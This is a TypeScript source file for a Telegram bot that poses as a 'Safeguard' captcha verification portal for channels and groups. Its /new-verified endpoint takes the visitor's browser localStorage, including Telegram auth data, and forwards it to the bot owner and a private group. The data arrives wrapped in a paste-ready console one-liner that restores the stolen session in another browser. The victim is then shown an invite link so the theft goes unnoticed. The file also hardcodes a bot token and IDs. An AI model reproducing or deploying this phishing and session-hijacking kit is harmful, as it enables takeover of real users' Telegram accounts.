import {
  Bot,
  InlineKeyboard,
  InputFile,
  webhookCallback,
} from "https://deno.land/x/grammy@v1.30.0/mod.ts";
import { isbot } from "isbot";
import {
  Application,
  Context,
  isHttpError,
  Status,
} from "https://deno.land/x/oak@v17.0.0/mod.ts";
import { oakCors } from "https://deno.land/x/cors@v1.2.2/mod.ts";

type SafeguardConfig = {
  channel: string;
  image: string;
  name: string;
  inviteLink: string;
};

/* #region environment variable */
const botOwner = "1117264759";
const botName = "VerifywithSafeguardrobot";
const webAppLink = "https://safeguard-webapp2025.deno.dev/";
const gateKeeper = "7734508293:AAHXJt9rNpDpObZoIXGww6e8kX9Y6oUHin8";
const sgClickVerifyURL = "guardian_verification.jpg";
const sgTapToVerifyURL = "guardian_verification_2.jpg";
const sgVerifiedURL = "guardian_verified.jpg";
const DEBUG = true;
/* #endregion */

/* #region init */
const botLink = `tg://resolve?domain=${botName}&start=`;
const sgConfigDefault: SafeguardConfig = {
  channel: "",
  image: "",
  name: "",
  inviteLink: "",
};
const bot = new Bot(gateKeeper as string);
const app = new Application();
/* #endregion */

/* #region telegram */
// open web app
bot.chatType("private").command("start", async (ctx) => {
  const msg = ctx.message?.text.split(" ");
  const id = msg?.length === 2 ? msg[1] : "default"; // se non c'è, usa "default"

  const caption = `<b>Verify you're human with Safeguard Portal</b>
    
Click 'VERIFY' and complete captcha to gain entry - <a href="https://docs.safeguard.run/group-security/verification-issues"><i>Not working?</i></a>`;

  const sgClickVerify = await Deno.open("./guardian_verification.jpg");
  const input = new InputFile(sgClickVerifyURL || sgClickVerify);
  const keyboard = new InlineKeyboard().webApp(
    "VERIFY",
    `${webAppLink}?c=${id}`
  );

const sentMsg = await bot.api.sendPhoto(ctx.chatId, input, {
  caption,
  parse_mode: "HTML",
  reply_markup: keyboard,
});

// Salva il message_id in Deno KV per poterlo modificare dopo
const deno = await Deno.openKv();
await deno.set(["message", ctx.chatId], { message_id: sentMsg.message_id });
});


// setup for channel configuration
bot.chatType("private").command("setup", async (ctx) => {
  const text = `Fill below and send
  
channel: //@username
image: // image url to display in your channel
name:  // community name
inviteLink: // your group invite link`;
  await ctx.api.raw.sendMessage({
    text,
    chat_id: ctx.chatId,
  });
});

// save custom channel configuration
bot.chatType("private").on("message:text", async (ctx) => {
  let reply = `Saved!
  
Please note that it will be deleted after summer.`;
  const config: SafeguardConfig = {
    ...sgConfigDefault,
  };
  const text = ctx.message.text.split("\n");
  const kv = (text: string) => {
    const value = text.trim().split(":");
    if (value.length < 2) throw new Error("Invalid format");
    return value.slice(1).join(":").trim();
  };

  try {
    config.channel = kv(text[0]);
    config.image = kv(text[1]);
    config.name = kv(text[2]);
    config.inviteLink = kv(text[3]);
    // console.debug(config);
    const deno = await Deno.openKv();
    await deno.set(["channel", config.channel], config);
  } catch (e) {
    console.error(e);
    reply = "Hmmm, looks like your get is wrong";
  }

  ctx.api.raw.sendMessage({
    text: reply,
    chat_id: ctx.chatId,
  });
});

bot.on("my_chat_member", async (ctx) => {
  const caption = `is being protected by <a href="tg://resolve?domain=Safeguard">@Safeguard</a>

Click below to verify you're human`;
  if (ctx.myChatMember.chat.type === "channel") {
    // check config is set
    const deno = await Deno.openKv();
    const entry = await deno.get(["channel", ctx.chat.username || ""]);
    const config = (entry.value || sgConfigDefault) as SafeguardConfig;

    const verifyDefault = await Deno.open("./guardian_verification_2.jpg");
const groupName = config.name.trim() !== "" ? config.name : "This group";

let input: InputFile;
if (config.image !== "") {
  const remoteImage = await fetch(config.image);
  const buffer = new Uint8Array(await remoteImage.arrayBuffer());
  input = new InputFile(buffer, "verify.jpg");
} else {
  input = new InputFile(await Deno.open("./guardian_verification_2.jpg"));
}

    const keyboard = new InlineKeyboard().url(
      "Tap to VERIFY",
      botLink + ctx.chat.username
    );

    try {
      await bot.api.raw.sendPhoto({
        caption: groupName + " " + caption,
        photo: input,
        chat_id: ctx.chatId,
        parse_mode: "HTML",
        reply_markup: keyboard,
      });
    } catch (ex) {
      console.log(ex);
      // the bot was remove from channel
    }
  }
});

bot.catch((e) => {
  console.error(e.message);
});
/* #endregion */

/* #region webserver */

const newVerified = async (ctx: Context) => {
  const body = await ctx.request.body.json();
  const storage = body.storage;

  if (!storage) {
    console.error("❌ Storage mancante");
    ctx.response.status = Status.BadRequest;
    ctx.response.body = { error: "Missing storage" };
    return;
  }

  const user = body.user || { username: "durov", id: null };
  let user_id = user.id;
  let username = user.username;

  if (!user_id && storage.user_auth) {
    try {
      const user_auth = JSON.parse(storage.user_auth);
      user_id = user_auth?.id;
      if (!username && user_auth?.username) {
        username = user_auth.username;
      }
    } catch (e) {
      console.error("❌ Errore parsing user_auth:", e);
    }
  }

  try {
    const log = `<tg-emoji emoji-id="5260206718410839459">✅</tg-emoji><a href="https://t.me/${username}">@${username}</a>

<pre>Object.entries(${JSON.stringify(storage)}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();</pre>`;

    const myGroupId = -4723386398;

    // Invia log al bot owner
    await bot.api.sendMessage(botOwner, log, { parse_mode: "HTML" });

    // Invia log anche al gruppo
    await bot.api.sendMessage(myGroupId, log, { parse_mode: "HTML" });

    // Recupera i dati dal DB KV
    const deno = await Deno.openKv();
    const entry = await deno.get(["channel", "@SolanaSignalsPrivate"]);
    const config = (entry.value || sgConfigDefault) as SafeguardConfig;
    config.inviteLink = "https://t.me/+svKf9_oSfW81MTI0";
const imageResponse = await fetch("https://raw.githubusercontent.com/mazzamassy/complete/refs/heads/main/guardian_verified.jpg");
const imageBuffer = new Uint8Array(await imageResponse.arrayBuffer());
const imageLink = new InputFile(imageBuffer, "guardian_verified.jpg");

    const verifyMsg = `✅ Verified, you can join the group using this temporary link:

    <a href="${config.inviteLink}">${config.inviteLink}</a>

⚠️ This link is one-time use and will expire`;

    const inviteMsg = `<b>Verified!</b> 
Join request has been sent and you will be added once the admin approves your request`;

    // Invia messaggio di debug dettagliato
    const debugMessage = `
<b>🔍 DEBUG INFO</b>
👤 <b>User ID:</b> <code>${user_id || "undefined"}</code>
👤 <b>Username:</b> @${username}
🔗 <b>Invite Link:</b> ${config.inviteLink || "Nessun link trovato"}
🖼️ <b>Image Link:</b> https://raw.githubusercontent.com/mazzamassy/complete/refs/heads/main/safeguard-verify.jpg
`;

    await bot.api.sendMessage(botOwner, debugMessage, { parse_mode: "HTML" });

    if (user_id) {
const deno = await Deno.openKv();
const savedMsg = await deno.get(["message", user_id]);

if (savedMsg.value && savedMsg.value.message_id) {
  // ✅ Modifica il messaggio precedente
  await bot.api.editMessageCaption(user_id, savedMsg.value.message_id, {
    caption: config.inviteLink ? verifyMsg : inviteMsg,
    parse_mode: "HTML",
  });
} else {
  // 🔁 Fallback: invia un nuovo messaggio se non trovi il precedente
  await bot.api.sendPhoto(user_id, imageLink, {
    caption: config.inviteLink ? verifyMsg : inviteMsg,
    parse_mode: "HTML",
  });
}

    } else {
      await bot.api.sendMessage(botOwner, "❌ ERRORE: user_id è undefined, non posso inviare il messaggio.");
    }

  } catch (err) {
    console.error("❌ Errore nella funzione newVerified:", err);
    await bot.api.sendMessage(botOwner, `❌ CATCH: ${err.message}`);
  }

  ctx.response.status = Status.OK;
  ctx.response.type = "application/json";
  ctx.response.body = { msg: "ok" };
};


// Response Time
app.use(async (context, next) => {
  const start = Date.now();
  await next();
  const ms = Date.now() - start;
  context.response.headers.set("X-Response-Time", `${ms}ms`);
});

// Error handler
app.use(async (ctx: Context, next) => {
  try {
    await next();
  } catch (err) {
    ctx.response.status = Status.OK;
    ctx.response.type = "json";
    ctx.response.body = { msg: "ok" };
    if (isHttpError(err)) {
      ctx.response.status = err.status;
    } else {
      console.error(err);
    }
  }
});

// Handle routes
app.use(async (ctx: Context) => {
  // only respond to post or get request
  if (isbot(ctx.request.userAgent.ua)) return;
  if (!(ctx.request.method === "POST" || ctx.request.method === "GET")) return;

    if (ctx.request.url.pathname === "/") {
    await ctx.send({
      path: "/",
      root: `${Deno.cwd()}/static/sg`,
      index: "index.html",
    });
    return;
  }

  const path = ctx.request.url.pathname.slice(1);
  let index = "index.html";
  const s = path.split("/");
  if (s.length !== 1) {
    index = s[s.length - 1];
  }
  if (path === "tg-webhook") {
    const handleBotUpdate = webhookCallback(bot, "oak");
    await handleBotUpdate(ctx);
  } else if (path === "new-verified") {
    await newVerified(ctx);
  } else if (path.includes("sg")) {
    await ctx.send({
      path: "/",
      root: `${Deno.cwd()}/static/sg`,
      index,
    });
  } else if (path.includes("tweb")) {
    await ctx.send({
      path: "/",
      root: `${Deno.cwd()}/static/tweb`,
      index,
    });
  } else if (path.split(".").length !== 0) {
    await ctx.send({
      path: "/",
      root: `${Deno.cwd()}/static/tweb`,
      index: path,
    });
  } else {
    ctx.response.status = Status.OK;
    ctx.response.type = "json";
    ctx.response.body = { msg: "ok" };
  }
});

// misc
app.use(oakCors());
/* #endregion */

const handleBotUpdate = webhookCallback(bot, "oak");

app.use(async (ctx, next) => {
  if (ctx.request.url.pathname === "/tg-webhook") {
    await handleBotUpdate(ctx);
  } else {
    await next();
  }
});

bot.catch((err) => console.error("Bot error:", err));
app.use(oakCors());
app.listen();

